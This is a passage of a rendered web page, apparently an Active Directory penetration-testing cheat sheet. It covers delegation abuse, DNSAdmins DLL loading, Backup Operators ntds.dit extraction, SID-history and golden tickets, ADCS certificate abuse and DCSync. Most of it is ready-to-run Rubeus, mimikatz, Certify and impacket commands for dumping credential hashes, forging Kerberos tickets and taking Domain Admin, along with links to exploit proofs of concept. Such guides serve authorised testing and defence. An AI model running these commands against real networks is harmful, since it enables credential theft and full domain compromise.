</span><span id="__span-48-21"><a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">MachineAccountName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">RC4HashOfMachineAccountPassword</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">TargetMachine</span><span class="p">.</span><span class="n">wtver</span><span class="p">.</span><span class="n">domain</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">wtver</span><span class="p">.</span><span class="n">domain</span> <span class="p">/</span><span class="n">ptt</span>
</span><span id="__span-48-22"><a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a>
</span><span id="__span-48-23"><a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a><span class="c">#Finally we can access the C$ drive of the target machine</span>
</span><span id="__span-48-24"><a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">TargetMachine</span><span class="p">.</span><span class="n">wtver</span><span class="p">.</span><span class="n">domain</span><span class="p">\</span><span class="n">C</span><span class="p">$</span>
</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li>
<li><a href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/">RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></li>
</ul>
<p>:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c">#Command on Rubeus</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">nowrap</span>
</span></code></pre></div>
<p>Detailed Article:
<a href="https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/">Rubeus – Now With More Kekeo</a></p>
<h2 id="dnsadmins-abuse">DNSAdmins Abuse</h2>
<p><em>WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.</em></p>
<ol>
<li>Enumerate the members of the DNSAdmins group:</li>
<li>PowerView: <code>Get-NetGroupMember -GroupName "DNSAdmins"</code></li>
<li>AD Module: <code>Get-ADGroupMember -Identiny DNSAdmins</code></li>
<li>Once we found a member of this group we need to compromise it (There are many ways).</li>
<li>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>   #Using dnscmd:
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>   dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>   #Restart the DNS Service:
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>   sc \\DNSServer stop dns
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>   sc \\DNSServer start dns
</span></code></pre></div>
<ul>
<li>
<p>Abusing Active Directory-Integraded DNS</p>
</li>
<li>
<p><a href="https://blog.netspi.com/exploiting-adidns/">Exploiting Active Directory-Integrated DNS</a></p>
</li>
<li><a href="https://blog.netspi.com/adidns-revisited/">ADIDNS Revisited</a></li>
<li>
<p><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></p>
</li>
<li>
<p>Abusing Backup Operators Group</p>
</li>
</ul>
<p><em>WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.</em></p>
<ol>
<li>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>   #Create a .txt file that will contain the shadow copy process script
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>   Script -&gt;{
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>   set context persistent nowriters
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>   set metadata c:\windows\system32\spool\drivers\color\example.cab
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>   set verbose on
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>   begin backup
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>   add volume c: alias mydrive
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>   create
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a>   expose %mydrive% w:
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a>   end backup
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>   }
</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a>
</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>   #Execute diskshadow with our script as parameter
</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a>   diskshadow /s script.txt
</span></code></pre></div>
<ol>
<li>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
   going to use <a href="https://github.com/giuliano108/SeBackupPrivilege">tSeBackupPrivilege</a> amazing repo:</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>   #Importing both dlls from the repo using powershell
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>   Import-Module .\SeBackupPrivilegeCmdLets.dll
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>   Import-Module .\SeBackupPrivilegeUtils.dll
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>   #Checking if the SeBackupPrivilege is enabled
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>   Get-SeBackupPrivilege
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>   #If it isn&#39;t we enable it
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>   Set-SeBackupPrivilege
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a>   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite
</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>
</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>   #Dump the SYSTEM hive
</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a>   reg save HKLM\SYSTEM c:\temp\system.hive
</span></code></pre></div>
<ol>
<li>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</li>
<li>Use secretsdump.py from impacket and dump the hashes.</li>
<li>
<p>Use psexec or another tool of your choice to PTH and get Domain Admin access.</p>
</li>
<li>
<p>Abusing Exchange</p>
</li>
<li>
<p><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">Abusing Exchange one Api call from DA</a></p>
</li>
<li><a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">CVE-2020-0688</a></li>
<li>
<p><a href="https://github.com/dirkjanm/PrivExchange">PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</p>
</li>
<li>
<p>Weaponizing Printer Bug</p>
</li>
<li>
<p><a href="https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/">Printer Server Bug to Domain Administrator</a></p>
</li>
<li>
<p><a href="https://github.com/NotMedic/NetNTLMtoSilverTicket">NetNTLMtoSilverTicket</a></p>
</li>
<li>
<p>Abusing ACLs</p>
</li>
<li>
<p><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory</a></p>
</li>
<li><a href="https://github.com/fox-it/aclpwn.py">aclpwn.py</a></li>
<li>
<p><a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a></p>
</li>
<li>
<p>Abusing IPv6 with mitm6</p>
</li>
<li>
<p><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">Compromising IPv4 networks via IPv6</a></p>
</li>
<li><a href="https://github.com/fox-it/mitm6">mitm6</a></li>
</ol>
<h2 id="sid-history-abuse">SID History Abuse</h2>
<p><em>WUT IS DIS?: If we manage to compromise a child domain of a forest and <a href="https://www.itprotoday.com/windows-8/sid-filtering">SID filtering</a> isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a href="https://www.itprotoday.com/windows-8/sid-history">SID History</a> field on a kerberos TGT ticket, that defines the "extra" security groups and privileges.</em></p>
<p>Exploitation example:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c">#Get the SID of the Current Domain using PowerView</span>
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="nb">Get-DomainSID</span> <span class="n">-Domain</span> <span class="n">current</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="c">#Get the SID of the Root Domain using PowerView</span>
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="nb">Get-DomainSID</span> <span class="n">-Domain</span> <span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>
</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="c">#Create the Enteprise Admins SID</span>
</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="n">Format</span><span class="p">:</span> <span class="n">RootDomainSID</span><span class="p">-</span><span class="n">519</span>
</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>
</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a><span class="c">#Forge &quot;Extra&quot; Golden Ticket using mimikatz</span>
</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">current</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:&lt;</span><span class="n">CurrentDomainSID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:&lt;</span><span class="n">krbtgtHash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">sids</span><span class="p">:&lt;</span><span class="n">EnterpriseAdminsSID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">startoffset</span><span class="p">:</span><span class="n">0</span> <span class="p">/</span><span class="n">endin</span><span class="p">:</span><span class="n">600</span> <span class="p">/</span><span class="n">renewmax</span><span class="p">:</span><span class="n">10080</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">ticket</span><span class="p">\</span><span class="n">golden</span><span class="p">.</span><span class="n">kirbi</span>
</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>
</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a><span class="c">#Inject the ticket into memory</span>
</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">ticket</span><span class="p">\</span><span class="n">golden</span><span class="p">.</span><span class="n">kirbi</span>
</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>
</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a><span class="c">#List the DC of the Root Domain</span>
</span><span id="__span-53-17"><a id="__codelineno-53-17" name="__codelineno-53-17" href="#__codelineno-53-17"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">C</span><span class="p">$</span>
</span><span id="__span-53-18"><a id="__codelineno-53-18" name="__codelineno-53-18" href="#__codelineno-53-18"></a>
</span><span id="__span-53-19"><a id="__codelineno-53-19" name="__codelineno-53-19" href="#__codelineno-53-19"></a><span class="c">#Or DCsync and dump the hashes using mimikatz</span>
</span><span id="__span-53-20"><a id="__codelineno-53-20" name="__codelineno-53-20" href="#__codelineno-53-20"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">all</span>
</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden</a></li>
<li><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li>
</ul>
<h2 id="exploiting-sharepoint">Exploiting SharePoint</h2>
<ul>
<li><a href="https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d">CVE-2019-0604</a> RCE Exploitation \
  <a href="https://github.com/k8gege/CVE-2019-0604">PoC</a></li>
<li><a href="https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization">CVE-2019-1257</a> Code execution through BDC deserialization</li>
<li>
<p><a href="https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters">CVE-2020-0932</a> RCE using typeconverters \
  <a href="https://github.com/thezdi/PoC/tree/master/CVE-2020-0932">PoC</a></p>
</li>
<li>
<p>Zerologon</p>
</li>
<li>
<p><a href="https://www.secura.com/whitepapers/zerologon-whitepaper">Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</p>
</li>
<li><a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon">SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</li>
<li><a href="https://github.com/BC-SECURITY/Invoke-ZeroLogon">Invoke-ZeroLogon</a>: PowerShell implementation of the Zerologon exploit.</li>
<li>
<p><a href="https://github.com/bb00/zer0dump">Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</p>
</li>
<li>
<p>PrintNightmare</p>
</li>
<li>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527">CVE-2021-34527</a>: Vulnerability details.</p>
</li>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">Impacket implementation of PrintNightmare</a>: Reliable PoC of PrintNightmare using the impacket library.</li>
<li>
<p><a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">C# Implementation of CVE-2021-1675</a>: Reliable PoC of PrintNightmare written in C#.</p>
</li>
<li>
<p>Active Directory Certificate Services</p>
</li>
</ul>
<p><strong>Check for Vulnerable Certificate Templates with:</strong> <a href="https://github.com/GhostPack/Certify">Certify</a></p>
<p><em>Note: Certify can be executed with Cobalt Strike's <code>execute-assembly</code> command as well</em></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span> <span class="p">/</span><span class="n">quiet</span>
</span></code></pre></div>
<p>Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.</p>
<p>This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
and use the captured certificate with Rubeus to forge authentication.</p>
<p><em>Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.</em></p>
<p>Request the DA's Account Certificate with Certify</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">template</span><span class="p">:&lt;</span><span class="n">Template</span> <span class="n">Name</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="s2">&quot;&lt;CA Name&gt;&quot;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=&lt;</span><span class="n">domain</span><span class="p">&gt;,</span><span class="n">DC</span><span class="p">=</span><span class="n">com</span> <span class="p">/</span><span class="n">altname</span><span class="p">:&lt;</span><span class="n">Domain</span> <span class="n">Admin</span> <span class="n">AltName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">machine</span>
</span></code></pre></div>
<p>This should return a valid certificate for the associated DA account.</p>
<p>The exported <code>cert.pem</code> and <code>cert.key</code> files must be consolidated into a single <code>cert.pem</code> file, with one gap of whitespace between the <code>END RSA PRIVATE KEY</code> and the <code>BEGIN CERTIFICATE</code>.</p>
<p><em>Example of <code>cert.pem</code>:</em></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>-----BEGIN RSA PRIVATE KEY-----
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>BIIEogIBAAk15x0ID[...]
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>[...]
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>[...]
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>-----END RSA PRIVATE KEY-----
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a>-----BEGIN CERTIFICATE-----
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>BIIEogIBOmgAwIbSe[...]
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a>[...]
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a>[...]
</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a>-----END CERTIFICATE-----
</span></code></pre></div>
<ul>
<li>Utilize <code>openssl</code> to Convert to PKCS #12 Format</li>
</ul>
<p>The <code>openssl</code> command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>cert.pem<span class="w"> </span>-keyex<span class="w"> </span>-CSP<span class="w"> </span><span class="s2">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span><span class="w"> </span>-export<span class="w"> </span>-out<span class="w"> </span>cert.pfx
</span></code></pre></div>
<p>Once the <code>cert.pfx</code> file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, <code>certutil.exe</code>, Cobalt Strike's upload functionality, etc.)</p>
<p>After the <code>cert.pfx</code> file has been uploaded to the compromised host, <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> can be used to request a Kerberos TGT for the DA account which will then be imported into memory.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktht</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">Domain</span> <span class="n">Admin</span> <span class="n">AltName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="p">:&lt;</span><span class="n">Domain</span> <span class="n">Controller</span> <span class="n">IP</span> <span class="n">or</span> <span class="n">Hostname</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:&lt;</span><span class="n">Local</span> <span class="n">Machine</span> <span class="n">Path</span> <span class="n">to</span> <span class="n">cert</span><span class="p">.</span><span class="n">pfx</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
</span></code></pre></div>
<p>This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.</p>
<ul>
<li>
<p>No PAC</p>
</li>
<li>
<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">sAMAccountname Spoofing</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</p>
</li>
<li><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">Weaponisation of CVE-2021-42287/CVE-2021-42278</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</li>
<li><a href="https://github.com/cube0x0/noPac">noPAC</a> C# tool to exploit CVE-2021-42278 and CVE-2021-42287</li>
<li><a href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a> Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287</li>
<li>
<p><a href="https://github.com/Ridter/noPac">noPac</a> Evolution of "sam-the-admin" tool</p>
</li>
<li>
<p>Domain Persistence</p>
</li>
<li>
<p>Golden Ticket Attack</p>
</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c">#Execute mimikatz on DC as DA to grab krbtgt hash:</span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::lsa /patch&quot;&#39;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">DC</span><span class="s1">&#39;sName&gt;</span>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="s1">#On any machine:</span>
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="s1">Invoke-Mimikatz -Command &#39;</span><span class="s2">&quot;kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain&#39;s SID&gt; /krbtgt:</span>
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="s2">&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;</span><span class="err">&#39;</span>
</span></code></pre></div>
<ul>
<li>DCsync Attack</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c">#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):</span>
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;&quot;&#39;</span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="c">#DCsync using secretsdump.py from impacket with NTLM authentication</span>
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;/&lt;</span><span class="n">Username</span><span class="p">&gt;:&lt;</span><span class="n">Password</span><span class="p">&gt;@&lt;</span><span class="n">DC</span><span class="s1">&#39;S IP or FQDN&gt; -just-dc-ntlm</span>
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>
